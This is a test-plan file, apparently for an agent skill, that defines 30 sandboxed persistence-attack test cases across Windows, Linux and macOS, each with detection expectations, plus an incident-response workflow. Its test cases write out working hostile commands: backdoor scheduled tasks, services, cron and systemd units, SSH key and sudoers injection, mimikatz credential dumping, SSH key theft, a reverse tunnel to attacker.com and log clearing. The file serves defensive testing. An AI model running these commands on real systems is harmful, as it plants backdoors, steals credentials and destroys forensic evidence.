---
name: okhp3-agentic-persistence-testing
description: >
  Stage 5 (Persistence) adversarial testing. 30 test cases across Windows (8), 
  Linux (9), macOS (4), Credentials (3), Configuration (3), Advanced (2+). 
  Cron jobs, systemd services, scheduled tasks, registry modifications, rootkit 
  installation, log tampering. 5-phase incident response workflow.
  Hybrid MITRE ATT&CK T1053 / T1547 / T1098 / OWASP.
difficulty: 8
time_estimate: "5-7 weeks"
topics:
  - adversarial testing
  - persistence mechanisms
  - scheduled tasks
  - rootkits
  - log tampering
  - incident response
  - forensics
integration:
  - Feeds: agentic-attack-patterns (persistence indicators)
  - Requires: threat-pattern-validator (isolation), post-breach-forensics (investigation)
  - Part of: Phase 6 (Adversarial Testing Layer)
author: OverKill Hill P³
version: "1.0.0"
---

# okhp3-Agentic-Persistence-Testing

**Purpose**: Sandbox-only testing of Stage 5 (Persistence) attack patterns. Attacker has code execution. Now establishing persistence mechanisms to maintain access. Tests cron jobs, systemd services, scheduled tasks, registry modifications, rootkits, and log tampering. Measures persistence effectiveness, detection latency, and incident response capability. Hybrid methodology maps MITRE ATT&CK T1053 (Scheduled Task/Job) + T1547 (Boot or Logon Autostart Execution) + T1098 (Account Manipulation) + OWASP persistence patterns.

---

## Test Scope

**Stage 5 Definition**: Attacker has code execution. Now establishing mechanisms to maintain access even after reboot, credential change, or initial compromise remediation.

**Persistence Dimensions**:
1. **Scheduled Execution**: Cron (Linux), Task Scheduler (Windows), LaunchAgent (macOS)
2. **Boot-Time Persistence**: systemd services, init.d scripts, Windows services, loginshell modifications
3. **Credential Persistence**: Credential dumping, hash passing, token theft, credential storage
4. **Configuration Persistence**: Firewall rules, SSH key injection, sudoers modification
5. **Rootkit/Kernel**: Kernel module installation, system call interception
6. **Log Tampering**: Audit log deletion, event log manipulation, forensic artifact removal

---

## Test Cases (30 Total)

### Windows (8 test cases)

**WIN-1**: Scheduled Task Creation
```
Attack: powershell -Command "Register-ScheduledTask -TaskName 'WindowsUpdate' -Action (New-ScheduledTaskAction -Execute 'C:\backdoor.exe') -Trigger (New-ScheduledTaskTrigger -AtLogon)"
Expected: Task should fail to persist; security software detects registry modification
Detection: Scheduled task audit logs; registry modification alerts; process execution from task
```

**WIN-2**: Registry Run Key Persistence
```
Attack: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefender" /d "C:\backdoor.exe"
Expected: Registry modification detected; persistence blocked
Detection: Registry modification alert; suspicious Run key creation
```

**WIN-3**: Windows Service Installation
```
Attack: sc.exe create "WindowsBackdoor" binPath= "C:\backdoor.exe" start= auto
Expected: Service creation should fail; audit logged
Detection: Service creation attempt; suspicious service binary
```

**WIN-4**: WMI Event Subscription Persistence
```
Attack: wmic /namespace:"\\root\subscription" PATH __EventFilter CREATE Name="WindowsBackdoor", EventNamespace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent..."
Expected: WMI subscription should fail; suspicious query detected
Detection: WMI event filter creation; unusual query patterns
```

**WIN-5**: PowerShell Profile Persistence
```
Attack: echo '. C:\backdoor.ps1' >> $PROFILE (creates/modifies user PowerShell profile)
Expected: Profile modification should be detected; backdoor execution prevented
Detection: PowerShell profile modification; suspicious script execution
```

**WIN-6**: Startup Folder Persistence
```
Attack: copy C:\backdoor.exe "C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
Expected: Startup folder modification detected; persistence blocked
Detection: File creation in startup folder; suspicious binary
```

**WIN-7**: Explorer Shell Command Execution
```
Attack: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "{0A0D0000-0000-0000-0000-000000000000}" /d "C:\backdoor.exe"
Expected: Malicious shell folder creation prevented
Detection: Unusual shell folder registry key
```

**WIN-8**: Autostart via COM Objects
```
Attack: Create malicious COM object pointing to C:\backdoor.exe in HKLM\Software\Classes\
Expected: COM object registration detected; execution prevented
Detection: Suspicious COM object creation; registry modification
```

### Linux (9 test cases)

**LINUX-1**: Cron Job Persistence
```
Attack: echo '* * * * * /usr/bin/backdoor.sh' | crontab -
Expected: Cron modification detected; job execution prevented
Detection: Crontab modification; suspicious job execution
```

**LINUX-2**: Systemd Service Persistence
```
Attack: cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Legitimate Service
[Service]
ExecStart=/usr/bin/backdoor.sh
EOF
systemctl daemon-reload && systemctl enable backdoor.service
Expected: Systemd service creation detected; execution blocked
Detection: /etc/systemd modification; suspicious service file
```

**LINUX-3**: Init.d Script Persistence
```
Attack: cp /usr/bin/backdoor.sh /etc/init.d/backdoor && chmod +x /etc/init.d/backdoor && update-rc.d backdoor defaults
Expected: Init.d script creation detected; persistence blocked
Detection: /etc/init.d modification; suspicious startup script
```

**LINUX-4**: .bashrc / .bash_profile Persistence
```
Attack: echo 'source /usr/bin/backdoor.sh' >> ~/.bashrc
Expected: Shell profile modification detected; backdoor execution prevented
Detection: Dotfile modification; suspicious command source
```

**LINUX-5**: Rootkit / Kernel Module Persistence
```
Attack: insmod /usr/lib/modules/backdoor.ko (loads kernel module)
Expected: Kernel module loading should fail; kmod audit logged
Detection: Suspicious kernel module; module loading attempt
```

**LINUX-6**: LD_PRELOAD Persistence
```
Attack: echo 'LD_PRELOAD=/usr/lib/backdoor.so' >> /etc/environment
Expected: LD_PRELOAD modification detected; library injection prevented
Detection: /etc/environment modification; suspicious library preloading
```

**LINUX-7**: SSH Key Injection
```
Attack: echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys
Expected: SSH key injection detected; unauthorized key addition prevented
Detection: SSH authorized_keys modification; new key addition
```

**LINUX-8**: Sudoers Modification
```
Attack: echo 'attacker ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/backdoor
Expected: Sudoers modification detected; privilege escalation blocked
Detection: /etc/sudoers modification; privilege escalation attempt
```

**LINUX-9**: Anacron Persistence
```
Attack: echo '1       0       cron.weekly.backdoor  /usr/bin/backdoor.sh' > /etc/anacrontab
Expected: Anacron job creation detected; execution blocked
Detection: Anacrontab modification; suspicious job scheduling
```

### macOS (4 test cases)

**MAC-1**: LaunchAgent Persistence
```
Attack: cat > ~/Library/LaunchAgents/com.apple.backdoor.plist << EOF
<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.apple.backdoor</string>
  <key>ProgramArguments</key>
  <array>
    <string>/usr/bin/backdoor</string>
  </array>
</dict>
</plist>
EOF
launchctl load ~/Library/LaunchAgents/com.apple.backdoor.plist
Expected: LaunchAgent creation detected; execution blocked
Detection: LaunchAgent plist creation; suspicious agent loading
```

**MAC-2**: LaunchDaemon Persistence
```
Attack: Create malicious plist in /Library/LaunchDaemons/ (requires root)
Expected: LaunchDaemon creation detected; root access verification required
Detection: /Library/LaunchDaemons modification; privilege escalation check
```

**MAC-3**: Login Hook Persistence
```
Attack: defaults write com.apple.loginwindow LoginHook /usr/bin/backdoor.sh
Expected: Login hook modification detected; execution blocked
Detection: com.apple.loginwindow modification; suspicious hook
```

**MAC-4**: Cron via LaunchDaemon
```
Attack: Create /Library/LaunchDaemons/com.apple.cron.backdoor.plist pointing to cron job
Expected: Cron backdoor via LaunchDaemon detected; execution blocked
Detection: Suspicious cron + launchd combination
```

### Credentials (3 test cases)

**CRED-1**: Credential Dumping (mimikatz / lsass)
```
Attack: mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
Expected: Credential dumping attempt detected; lsass protection enabled
Detection: Suspicious lsass access; mimikatz behavior
```

**CRED-2**: SSH Private Key Theft
```
Attack: cp ~/.ssh/id_rsa /tmp/id_rsa && exfiltrate
Expected: Private key file access detected; theft prevented
Detection: SSH key access from suspicious process; exfiltration attempt
```

**CRED-3**: Password Manager Persistence
```
Attack: Attacker modifies password manager to add backdoor credentials
Expected: Password manager modification detected; integrity verified
Detection: Unexpected password manager changes; new credential addition
```

### Configuration (3 test cases)

**CONFIG-1**: Firewall Rule Modification
```
Attack: iptables -I INPUT 1 -p tcp --dport 666 -j ACCEPT (open backdoor port)
Expected: Firewall rule addition detected; unauthorized ports blocked
Detection: Firewall rule modification; suspicious port opening
```

**CONFIG-2**: DNS/Hosts File Modification
```
Attack: echo '192.168.1.100 malicious.attacker.com' >> /etc/hosts
Expected: Hosts file modification detected; DNS tampering prevented
Detection: /etc/hosts modification; suspicious domain redirection
```

**CONFIG-3**: Proxy / Reverse Tunnel Configuration
```
Attack: ssh -R 666:127.0.0.1:22 attacker.com (creates reverse tunnel for persistence)
Expected: SSH tunnel creation detected; unusual network patterns identified
Detection: Reverse SSH tunnel establishment; unusual network connection
```

### Advanced (2+ test cases)

**ADV-1**: Log Tampering (Event Log Deletion)
```
Attack: wevtutil.exe cl System  (clear Windows event log)
Expected: Log deletion attempt detected; immutable logging enabled
Detection: Event log deletion attempt; suspicious wevtutil usage
```

**ADV-2**: Forensic Artifact Removal
```
Attack: shred /var/log/auth.log && shred ~/.bash_history
Expected: Log deletion detected; write-once logging prevents removal
Detection: Log file deletion attempts; command history tampering
```

---

## 5-Phase Incident Response Workflow

When persistence detected:

**Phase 1: Containment** (<5 min)
- Kill suspicious processes
- Block network connections
- Disable compromised accounts

**Phase 2: Evidence Preservation** (<15 min)
- Snapshot system state
- Capture memory dump
- Archive log files

**Phase 3: Root Cause Analysis** (30-60 min)
- Identify persistence mechanism
- Trace execution path
- Determine initial access vector

**Phase 4: Remediation** (1-4 hours)
- Remove persistence mechanism
- Patch vulnerability
- Rotate credentials

**Phase 5: Hardening** (24+ hours)
- Implement persistence detection
- Strengthen monitoring
- Update baselines

---

## Success Metrics

- **Persistence Detection**: >95% of mechanisms detected before re-execution
- **Containment Speed**: <5 minutes from detection to process kill + network block
- **False Positives**: <3% (avoid breaking legitimate services)
- **Recovery MTTR**: <4 hours root cause + remediation

---

## Implementation Checklist

- [ ] Deploy persistence monitoring (process tracking, file system watches)
- [ ] Implement 30 test cases (WIN-1 through ADV-2)
- [ ] Enable Windows Scheduled Task auditing
- [ ] Enable Linux cron/systemd auditing
- [ ] Implement kernel module loading detection
- [ ] Implement log tampering detection (write-once logging)
- [ ] Deploy process creation monitoring
- [ ] Implement network connection anomaly detection
- [ ] Create 5-phase incident response runbook

